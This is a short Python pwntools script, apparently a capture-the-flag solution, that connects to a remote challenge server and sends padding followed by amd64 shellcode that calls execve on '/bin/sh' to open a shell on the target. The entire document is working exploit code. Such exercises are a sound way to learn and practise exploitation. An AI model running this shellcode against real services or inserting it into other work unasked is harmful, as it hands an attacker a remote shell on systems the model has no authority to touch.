from pwn import *

context.clear(arch='amd64')

p = remote('chals.bitskrieg.in', 6001)

payload  = b''
payload += b'A' * 8
payload += asm("""
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp
    syscall
""")

p.sendline(payload)
